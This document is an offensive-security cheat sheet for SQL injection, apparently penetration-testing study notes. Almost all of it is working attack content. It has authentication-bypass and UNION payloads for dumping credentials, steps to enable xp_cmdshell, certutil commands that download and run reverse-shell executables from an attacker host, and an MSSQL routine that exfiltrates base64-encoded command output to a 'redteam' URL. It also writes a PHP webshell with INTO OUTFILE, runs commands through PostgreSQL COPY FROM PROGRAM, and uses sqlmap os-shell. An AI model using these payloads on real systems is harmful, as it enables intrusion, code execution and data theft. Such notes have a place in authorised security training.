## Identifying SQLi via Error-based Payloads

    ', ", ; 

## Comment delimiters
    
    --, /*, /* */, //, -- //, // -- 

## Common Error

    Microsoft OLE DB Provider for ODBC Drivers error
    Unknown column
    You have an error in your SQL syntax

## MySQL

```sh
mysql -u root -p'root' -h $IP -P 3306
SELECT version(); -- @@version
SELECT system_user(); # user()
SHOW databases; /* database() */
DESCRIBE users; -- //
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema not in ('sys', 'performance_schema', 'mysql', 'information_schema') ;

```

## MSSQL

```sh

# default port ms-sql : 1433
impacket-mssqlclient $USER:$PASS@$IP
impacket-mssqlclient $USER:$PASS@$IP -windows-auth
impacket-mssqlclient -windows-auth $DOMAIN/$USER:$PASS@$IP

SELECT @@version;
SELECT host_name();
SELECT name FROM sys.databases;
SELECT name FROM sys.table;
SELECT name FROM sys.columns;
SELECT db_name();
SELECT * FROM offsec.information_schema.tables;
SELECT * FROM offsec.dbo.users;

```

## Error-based Payloads

```sh

# Testing for SQLi Authentication Bypass
offsec' OR 1=1 -- //
' or 1=1 in (SELECT @@version) -- //
' or 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
## UNION-based Payloads

```sh
#  Finding the Exact Number of Columns
' ORDER BY 1-- //
' ORDER BY 2-- //

# Enumerating the Database via SQL UNION Injection
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //

# Dumping the Current Database Tables Structure
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

# Retrieving Current Database Tables and Columns
# Passwords are encrypted with MD5
' UNION SELECT null, username, password, description, null FROM users -- //

```

## Blind SQL Injections

```sh
# Testing for boolean-based SQLi
offsec' AND 1=1 -- //

# Testing for time-based SQLi
offsec' AND IF (1=1, sleep(3),'false') --  // # mysql
offsec'; IF(1=1) WAITFOR DELAY '0:0:05' -- // # mssql
```

## Manual Code Execution

```sh
#Microsoft SQL Server
# Enabling xp_cmdshell feature

impacket-mssqlclient $USER:$PASS@$IP -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshelldir', 1;
RECONFIGURE;

# Executing Commands via xp_cmdshell
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'certutil.exe -urlcache -f http://$IP/rev.exe c:\\windows\\temp\\rev.exe';
EXECUTE xp_cmdshell 'c:\\windows\\temp\\rev.exe';

# execute the xp_dirtree function back to our Kali
' OR 1=1 ; exec master.dbo.xp_dirtree '\\$KALI\test';--

```

## MSSQL data exfiltration

```sh
# Declare a variable of “table” type
declare @r varchar(4120),@cmdOutput varchar(4120);
declare @res TABLE(line varchar(max));
# Dump the output
insert into @res exec xp_cmdshell 'COMMAND';
# Concatenate the rows of the table, separated by a line break
# Encode the resulting string in Base64 and save it in a variable.
set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);
# Generate the certutil command, appending the string with the result
set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);
# Execute it
exec xp_cmdshell @r;
```

## MySQL database


```sh
# For this attack to work, the file location must be writable to the OS user running the database software.

# Write a WebShell To Disk via INTO OUTFILE, INTO DUMPFILE directive
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

# <?php system($_GET['cmd']);?> ⇒ ASCII Hex 3c3f...3e
'%20UNION%20ALL%20SELECT%200x<HEX>%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20INTO%20DUMPFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fwebshell.php%27%23
```

## PostgreSQL

```sh

DROP TABLE IF EXISTS cmd_exec; 
CREATE TABLE cmd_exec(cmd_output text); 
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec; 

```

## Automating the Attack

```sh
sqlmap -u http://$IP/blindsqli.php?user=1 -p user
sqlmap -u http://$IP/blindsqli.php?user=1 -p user --dump
sqlmap "$URL/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --current-user --answers="follow=Y" --batch -v 0
sqlmap -r req.txt -p ctl00%24ContentPlaceHolder1%24UsernameTextBox --level 5 --risk 3 --os-cmd=whoami
sqlmap -r req.txt -p ctl00%24ContentPlaceHolder1%24UsernameTextBox --level 5 --risk 3 --os-shell
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"

os-shell> certutil.exe -urlcache -f http://%IP%/shell.exe C:\Windows\Temp\shell.exe
os-shell> C:\Windows\Temp\shell.exe
```